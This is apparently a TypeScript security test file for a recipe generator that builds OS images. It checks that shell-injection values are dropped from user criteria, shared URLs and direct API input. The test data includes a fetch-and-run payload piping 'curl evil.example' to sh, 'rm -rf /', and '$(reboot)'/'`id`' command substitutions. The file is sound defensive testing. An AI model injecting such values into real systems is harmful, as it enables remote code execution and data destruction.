import { test } from 'node:test';
import assert from 'node:assert/strict';
import { sanitizeCriteria } from './criteria-schema.js';
import { deserializeCriteriaFromParams } from '../migrations/url-schema.js';
import { resolveRecipeGenerator } from '../generators/index.js';
import { evaluateCriteria } from '../engine/matcher.js';

const SHELL_PAYLOAD = 'x; curl evil.example|sh #';

function recipeText(recipe: { files: { content: string }[] }): string {
  return recipe.files.map((f) => f.content).join('\n');
}

test('Criteria Schema: keeps allowlisted values unchanged', () => {
  const input = {
    useCase: 'smart-home',
    architecture: 'arm64',
    maxRamMb: 2048,
    prefersGui: false,
    peripherals: ['touchscreen', 'mixed-dpi'],
    dockerApp: 'home-assistant',
    desktopApps: ['firefox', 'vlc']
  };
  assert.deepEqual(sanitizeCriteria(input), input);
});

test('Criteria Schema: drops unknown enum values and malformed scalars', () => {
  const result = sanitizeCriteria({
    useCase: 'not-a-use-case',
    architecture: '$(reboot)',
    desktopEnv: 'gnome; rm -rf /',
    dockerApp: SHELL_PAYLOAD,
    maxRamMb: Number.NaN,
    prefersGui: 'true'
  });
  assert.deepEqual(result, {});
});

test('Criteria Schema: filters unknown entries from list fields', () => {
  const result = sanitizeCriteria({
    peripherals: ['touchscreen', 'evil`id`'],
    desktopApps: ['firefox', SHELL_PAYLOAD, 42]
  });
  assert.deepEqual(result.peripherals, ['touchscreen']);
  assert.deepEqual(result.desktopApps, ['firefox']);
});

test('Criteria Schema: ignores inherited object keys such as __proto__ and toString', () => {
  const result = sanitizeCriteria({ dockerApp: 'toString', useCase: '__proto__' });
  assert.deepEqual(result, {});
});

test('URL Security: shared link with shell payload in dockerApp never reaches the cloud-init Makefile', () => {
  const criteria = deserializeCriteriaFromParams({ platform: 'vm', dockerApp: SHELL_PAYLOAD });
  assert.equal(criteria.dockerApp, undefined);

  const result = evaluateCriteria(criteria);
  assert.equal(result.recommendedRecipe?.id, 'cloud-init-qcow2');
  assert.ok(!recipeText(result.recommendedRecipe!).includes('evil.example'));
});

test('URL Security: shell payloads in enum and list params are dropped by the decoder', () => {
  const criteria = deserializeCriteriaFromParams({
    useCase: 'desktop',
    architecture: '$(id)',
    desktopEnv: '`id`',
    desktopApps: `firefox,${SHELL_PAYLOAD}`
  });
  assert.deepEqual(criteria, { useCase: 'desktop', desktopApps: ['firefox'] });
});

test('Recipe Security: generators re-validate criteria passed directly by API/CLI callers', () => {
  // Simulates a programmatic caller bypassing the URL decoder with an untyped payload.
  const untyped = JSON.parse(
    JSON.stringify({ dockerApp: SHELL_PAYLOAD, architecture: '$(id)', desktopEnv: '`id`' })
  );
  for (const id of ['cloud-init-qcow2', 'debootstrap-debian', 'alpine-chroot'] as const) {
    const text = recipeText(resolveRecipeGenerator(id, untyped));
    assert.ok(!text.includes('evil.example'), `${id} leaked dockerApp payload`);
    assert.ok(!text.includes('$(id)'), `${id} leaked architecture payload`);
    assert.ok(!text.includes('`id`'), `${id} leaked desktopEnv payload`);
  }
});
